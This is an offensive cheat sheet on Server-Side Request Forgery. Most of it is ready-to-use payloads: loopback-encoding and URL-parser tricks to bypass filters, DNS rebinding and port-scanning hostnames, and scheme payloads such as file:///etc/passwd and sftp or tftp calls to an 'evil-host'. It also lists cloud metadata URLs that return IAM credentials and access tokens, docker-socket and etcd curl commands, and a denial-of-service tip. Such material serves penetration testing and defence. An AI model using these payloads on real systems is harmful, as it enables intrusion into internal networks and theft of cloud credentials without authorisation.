Server Side Request Forgery is a vulnerability in which an attacker forces a server to perform requests on their behalf.

# Bypass Filters

Often applications block input containing non-whitelist hostname, sensitive URLs, or IP address like loopback, IPv4 link local, private address ([RFC1918](https://tools.ietf.org/html/rfc1918)), etc. In this situation, you can often bypass the filter using various techniques.

## Redirection 

You can try using redirection to the desired URL with a response with the code `3xx` and the URL in the `Location` header to bypass the filter as follows:

```http
HTTP/1.0 301 Moved Permanently
Server: nginx
Connection: close
Content-Length: 0
Location: http://127.0.0.1
```

For redirection, you can use following approaches:
- bash, like `nc -lvp 80 < response.txt`,
- URL shortener services,
- more flexible solutions, like simple HTTP server on python.

If the application contains an open redirection vulnerability you can use it to bypass the URL filter as follows:

```http
POST /api/v1/webhook HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 101

url=https://vulnerable-website.com/api/v1/project/next?currentProjectId=1929851&path=http://127.0.0.1
```

These bypass approaches work because the application can only validate for the provided URL, which causes the redirect. This follows the redirect and makes a request to the internal URL attacker's choosing.

## Rare IP Address

Rare IP address formats defined in [RFC 3986](https://tools.ietf.org/html/rfc3986#section-7.4).

- Dotted hexadecimal IP: `0x7f.0x0.0x0.0x1`
- Dotless hexadecimal IP: `0x7f001`
- Dotless hexadecimal IP with padding: `0x0a0b0c0d7f000001` (padding is `0a0b0c0d`)
- Dotless decimal IP: `2130706433`
- Dotted decimal IP with overflow (256): `383.256.256.257`
- Dotted octal IP: `0177.0.0.01`
- Dotless octal IP: `017700000001`
- Dotted octal IP with padding: `00177.000.0000.000001`
- Combined:

```http
0x7f.0.1
0x7f.1
00177.1
00177.0x0.1
```

You can short-hand IP addresses by dropping the zeros:

```http
1 part  (ping A)       : 0.0.0.A
2 parts (ping A.B)     : A.0.0.B
3 parts (ping A.B.C)   : A.B.0.C
4 parts (ping A.B.C.D) : A.B.C.D

0       => 0.0.0.0
127.1   => 127.0.0.1
127.0.1 => 127.0.0.1
```

### Abusing a Bug in Ruby's Native Resolver

`Resolv::getaddresses` is OS-dependent, therefore by playing around with different IP formats one can return blank values. 

Proof of concept:

```ruby
irb(main):001:0> require 'resolv'
=> true
irb(main):002:0> uri = "0x7f.1"
=> "0x7f.1"
irb(main):003:0> server_ips = Resolv.getaddresses(uri)
=> [] # The bug!
irb(main):004:0> blocked_ips = ["127.0.0.1", "::1", "0.0.0.0"]
=> ["127.0.0.1", "::1", "0.0.0.0"]
irb(main):005:0> (blocked_ips & server_ips).any?
=> false # Bypass
```

References:
- [Bypassing Server-Side Request Forgery filters by abusing a bug in Ruby's native resolver](https://edoverflow.com/2017/ruby-resolv-bug/)
- [Report: Blind SSRF in "Integrations" by abusing a bug in Ruby's native resolver](https://hackerone.com/reports/287245)
- [Report: SSRF vulnerability in gitlab.com via project import](https://hackerone.com/reports/215105)

## IPv6 Addresses

- IPv6 localhost:

```http
[::]
0000::1
[::1]
0:0:0:0:0:0:0:0
```

- IPv4-mapped IPv6 address: `[::ffff:7f00:1]`
- IPv4-mapped IPv6 address: `[::ffff:127.0.0.1]`
- IPv4-compatible IPv6 address (deprecated, q.v. [RFC4291](https://tools.ietf.org/html/rfc4291#section-2.5.5.1): `[::127.0.0.1]`
- IPv4-mapped IPv6 address with [zone identifier](https://tools.ietf.org/html/rfc6874): `[::ffff:7f00:1%25]`
- IPv4-mapped IPv6 address with [zone identifier](https://tools.ietf.org/html/rfc6874): `[::ffff:127.0.0.1%eth0]`

## Abusing Enclosed Alphanumerics

Enclosed alphanumerics is a Unicode block of typographical symbols of an alphanumeric within a circle, a bracket or other not-closed enclosure, or ending in a full stop, q.v. [list](https://jrgraphix.net/r/Unicode/2460-24FF).

```http
127。0。0。1
127｡0｡0｡1
127．0．0．1
⑫７｡⓪．𝟢。𝟷
𝟘𝖃𝟕𝒇｡𝟘𝔵𝟢｡𝟢𝙭⓪｡𝟘𝙓¹
⁰𝔁𝟳𝙛𝟢０１
２𝟏𝟑𝟢𝟕𝟢６𝟺𝟛𝟑
𝟥𝟪³。𝟚⁵𝟞。²₅𝟞。²𝟧𝟟
𝟢₁𝟳₇｡０｡０｡𝟢𝟷
𝟎𝟢𝟙⑦⁷。０００。𝟶𝟬𝟢𝟘。𝟎₀𝟎𝟢０𝟣
[::𝟏②₇．𝟘．₀．𝟷]
[::𝟭２𝟟｡⓪｡₀｡𝟣%𝟸𝟭⑤]
[::𝚏𝕱ᶠ𝕗:𝟏₂７｡₀｡𝟢｡①]
[::𝒇ℱ𝔣𝐹:𝟣𝟤７。₀。０。₁%②¹𝟧]
𝟎𝚇𝟕𝖋｡⓪｡𝟣
𝟎ˣ𝟩𝘍｡𝟷
𝟘𝟘①𝟕⑦．１
⓪𝟘𝟙𝟳𝟽｡𝟎𝓧₀｡𝟏
```

## Broken parser

The [URL specification](https://tools.ietf.org/html/rfc3986) contains a number of features that are liable to be overlooked when implementing ad hoc parsing and validation of URLs:
- Embedded credentials in a URL before the hostname, using the @ character: `https://expected-host@evil-host`
- Indication a URL fragment using the `#` character: `https://evil-host#expected-host`
- DNS naming hierarchy: `https://expected-host.evil-host`
- URL-encode characters. This can help confuse URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
- Combinations of these techniques together:

```http
foo@evil-host:80@expected-host
foo@evil-host%20@expected-host
evil-host%09expected-host
127.1.1.1:80\@127.2.2.2:80
127.1.1.1:80:\@@127.2.2.2:80
127.1.1.1:80#\@127.2.2.2:80
ß.evil-host
```

References:
- [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!](https://github.com/0xn3va/cheat-sheets/blob/master/Web%20Application/Server%20Side%20Request%20Forgery/materials/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
- [Tool: Tiny URL Fuzzer](https://github.com/orangetw/Tiny-URL-Fuzzer)

## DNS Pinning

If you want to get a A-record that resolves to an IP, use the following subdomain:

```http
make-<IP>-rr.1u.ms 
```

For example, domain resolves `make-127-0-0-1-rr.1u.ms` to `127.0.0.1`:

```bash
$ dig A make-127-0-0-1-rr.1u.ms
make-127-0-0-1-rr.1u.ms. 0	IN	A	127.0.0.1
```

Multiple records can be separated by `-and-`:

```http
make-<IP>-and-<IP>-rr.1u.ms
```

For example, domain resolves `make-127-0-0-1-and-127-127-127-127-rr.1u.ms` to `127.0.0.1` and `127.127.127.127`:

```bash
$ dig A make-127-0-0-1-and-127-127-127-127-rr.1u.ms
make-127-0-0-1-and-127-127-127-127-rr.1u.ms. 0 IN A 127.0.0.1
make-127-0-0-1-and-127-127-127-127-rr.1u.ms. 0 IN A 127.127.127.127
```

See more [1u.ms](http://1u.ms)

## DNS Rebinding

Often applications implement IP address verification, for example, that it is not loopback, IPv4 link local, private address ([RFC1918](https://tools.ietf.org/html/rfc1918)), etc. If the mechanisms for checking and establishing a connection are independent and there is no caching of the DNS resolution response, you can bypass this by controlling the DNS resolution response.

For example, if two requests go one after another, for 5 seconds, with DNS resolution `make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms` the first DNS query, the address `1.1.1.1` will be returned, and to the second` 127.0.0.1`.

```bash
$ dig A make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms
make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms. 0 IN A 1.1.1.1

$ dig A make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms
make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms. 0 IN A 127.0.0.1
```

See more [1u.ms](http://1u.ms)

# Credentials Bruteforce

SSRF allows you to bruteforce credentials for resources that use Basic access authentication as an authentication mechanism. To do this, just create a following link:

```http
http://login:password@target-website.com/path/
```

# Responses Anomaly

Sometimes you can rely on an anomaly of answers when using SSRF, if the response of request execution is not available to you. To do this, you need to access internal resources and measure the response time for each request. Response time is an indirect sign that may indicate the availability of a resource. Having sent a lot of requests, you need to search among them those for which the response time is different from all the others. This approach allows you to blindly bruteforce internal services, open ports, directories and files.

# Port Scanning Using DNS

Many libraries try to access the resource by IP in the order that they are placed in DNS records. For example, if the
 DNS records look like this:

```
site.com 172.16.1.1
site.com 172.16.1.2
```

first there will be an attempted connect to `172.16.1.1`, and if problems arise, to `172.16.1.2`. This allows you to find out which ports are open and which are not.

For this you can also use the service `http://1u.ms`. For example, if you need to find available ports on `127.0.0.1`, you can use

```
make-127-0-0-1-and-123-123-123-123rr.1u.ms
```

this will allow you to change the port number to determine which port is available.

```
http://make-127-0-0-1-and-123-123-123-123rr.1u.ms:22 - request did not come to 123.123.123.123:22
http://make-127-0-0-1-and-123-123-123-123rr.1u.ms:80 - request came to 123.123.123.123:80
http://make-127-0-0-1-and-123-123-123-123rr.1u.ms:6379 - request did not come to 123.123.123.123:6379
http://make-127-0-0-1-and-123-123-123-123rr.1u.ms:8080 - request came to 123.123.123.123:8080
```

This shows that ports `22` and `6379` are open on `127.0.0.1` because there were no connection attempts for the IP address from the second DNS record.

> It is worth paying attention to what DNS server resolves names on the backend side. DNS server can use the built-in round robin algorithm for resolving domain names and change the order of records

# Exploitation via URL Scheme & Protocols

## File

`file` scheme allows you to fetch the content of a file on the server:

```
file://path/to/file
file:///etc/passwd
file://\/\/etc/passwd
```

## HTTP

`http` scheme allows you to fetch any content from the web, it can also be used to scan ports:

```
http://127.0.0.1:80
http://127.0.0.1:22
http://127.0.0.1:6379
```

## Dict

`dict` scheme is used to refer to definitions or word lists available using the dict protocol:

```
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
```

## SFTP

SFTP is a network protocol used for secure file transfer over secure shell:

```
sftp://evil-host:1337/
```

## SMTP

When connected to SMTP, internal domains may leak from the first line:

1. Connect on SMTP: `localhost:25`
2. From the first line get the internal domain name: `220 http://subdomain.internal-host ESMTP Sendmail`
3. Search subdomains, for example, on github
4. Connect

References:
- [Twitter source post](https://twitter.com/har1sec/status/1182255952055164929)

## TFTP

TFTP or trivial file transfer protocol, works over UDP:

```
tftp://evil-host:1337/TESTUDPPACKET
```

## LDAP

LDAP is an application protocol used over an IP network to manage and access the distributed directory information service:

```
ldap://127.0.0.1:389/%0astats%0aquit
```

## Gopher

Gopher is a communications protocol designed for distributing, searching, and retrieving documents, see [more](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#gopher).

# Cloud

## Amazon Web Services

{% embed url="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html" %}

-  No header required.

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/user-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/<id>/openssh-key
```

{% embed url="https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html" %}

- No header required.

```
http://169.254.170.2/v2/metadata
http://169.254.170.2/v2/stats
http://169.254.170.2/v2/metadata/<container-id>
http://169.254.170.2/v2/stats/<container-id>
http://169.254.170.2/v2/credentials/
```

## Google Cloud

{% embed url="https://cloud.google.com/compute/docs/metadata" %}

- Requires the header `Metadata-Flavor: Google` or `X-Google-Metadata-Request: True` on API v1,
- Most endpoints can be accessed via the v1beta API without a header.

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Google allows recursive pulls 
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
# Root password for Google
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json
# kube-env: https://hackerone.com/reports/341876
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
# SSH Public Key
http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
# Get Access Token
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

## Digital Ocean

{% embed url="https://developers.digitalocean.com/documentation/metadata/" %}

- No header required.

```
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
```

## Packet Cloud

{% embed url="https://www.packet.com/developers/docs/servers/key-features/metadata/" %}

- No header required.

```
https://metadata.packet.net/metadata
```

## Microsoft Azure

{% embed url="https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service" %}

- Requires the header `Metadata: true`.

```
http://169.254.169.254/metadata/instance
http://169.254.169.254/metadata/instance?api-version=2018-10-01
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2018-10-01&format=text
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

## Alibaba Cloud

{% embed url="https://www.alibabacloud.com/help/doc-detail/49122.htm" %}

- No header required.

```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

## OpenStack

{% embed url="https://docs.openstack.org/nova/latest/user/metadata.html" %}

- No required header.

```
http://169.254.169.254/openstack
http://169.254.169.254/openstack/2018-08-27/meta_data.json
http://169.254.169.254/openstack/2018-08-27/network_data.json
http://169.254.169.254/openstack/2018-08-27/user_data
# EC2-compatible metadata
http://169.254.169.254/2009-04-04/meta-data/
http://169.254.169.254/2009-04-04/meta-data/public-keys/
http://169.254.169.254/2009-04-04/meta-data/public-keys/0/openssh-key
```

## Oracle Cloud

{% embed url="https://docs.oracle.com/en/cloud/iaas/compute-iaas-cloud/stcsg/retrieving-instance-metadata.html" %}

- No header required.

```
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

{% embed url="https://docs.cloud.oracle.com/en-us/iaas/Content/Compute/Tasks/gettingmetadata.htm" %}

- No header required.

```
http://169.254.169.254/opc/v1/instance/
```

# Kubernetes

```
# Debug Services https://kubernetes.io/docs/tasks/debug-application-cluster/debug-service/
https://kubernetes.default.svc.cluster.local
https://kubernetes.default
# https://twitter.com/Random_Robbie/status/1072242182306832384
https://kubernetes.default.svc/metrics
```

Kubernetes [etcd API](https://etcd.io/docs/v2/api/) can contain API keys, internal IPs and ports:

```bash
$ curl -L http://127.0.0.1:2379/version
$ curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

# Docker

```
http://127.0.0.1:2375/v1.24/containers/json
```

Simple example:

```bash
$ docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```

References:
- [dockerd - Daemon socket option](https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option)
- [Docker Engine API](https://docs.docker.com/engine/api/v1.40/)

# SVG

{% embed url="https://github.com/allanlw/svg-cheatsheet" %}

# ffmpeg 

References:
- [Viral Video Exploiting Ssrf In Video Converters](https://github.com/0xn3va/cheat-sheets/blob/master/Web%20Application/Server%20Side%20Request%20Forgery/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf)
- [Attacks on video converters: a year later](https://github.com/0xn3va/cheat-sheets/blob/master/Web%20Application/Server%20Side%20Request%20Forgery/materials/phdays-ffmpeg.pdf)
- [Report: SSRF and local file disclosure in https://wordpress.com/media/videos/ via FFmpeg HLS processing](https://hackerone.com/reports/237381)
- [Report: SSRF / Local file enumeration / DoS due to improper handling of certain file formats by ffmpeg](https://hackerone.com/reports/115978)
- [Tool: ffmpeg-avi-m3u-xbin](https://github.com/neex/ffmpeg-avi-m3u-xbin)

# iframe

`iframe` allow you read internal files:

```html
<iframe src="file:///etc/passwd" width="400" height="400">
```

References:
- [Report: Blind SSRF/XSPA on dashboard.lob.com + blind code injection](https://hackerone.com/reports/517461)

# PDFs Rendering

If the web page is automaticaly creating a PDF with some information you have provided, you can insert some JS that will be executed by the PDF creator itself (the server) while creating the PDF. Then, if you insert an iframe trying to load the content of the cloud metadata, the served pdf will contain the results of that iframe.

References:
- [Write up: Local File Read via XSS in Dynamically Generated PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)

# DoS

Create several sessions and try to download heavy files exploiting the SSRF from the sessions.

# Request Splitting

{% embed url="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/" %}

# Referer Header

Some applications employ server-side analytics software that tracks visitors. This software often logs the Referer header in requests, since this is of particular interest for tracking incoming links. Often the analytics software will actually visit any third-party URL that appears in the Referer header. This is typically done to analyze the contents of referring sites, including the anchor text that is used in the incoming links. As a result, the Referer header often represents fruitful attack surface for SSRF vulnerabilities.

# References

- [Web Security Academy: Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
- [Blind SSRF exploitation](https://lab.wallarm.com/blind-ssrf-exploitation/)
- [PayloadsAllTheThings: Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Write up: SSRF in CI after first run](https://hackerone.com/reports/369451)
- [Write up: GitLab::UrlBlocker validation bypass leading to full Server Side Request Forgery](https://hackerone.com/reports/541169)
- [Report: Gitlab DNS rebinding protection bypass](https://hackerone.com/reports/632101)
- [Write up: How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
- [Write up: GitLab 11.4.7 Remote Code Execution](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)
- [Tool: SSRF Proxy](https://github.com/bcoles/ssrf_proxy)
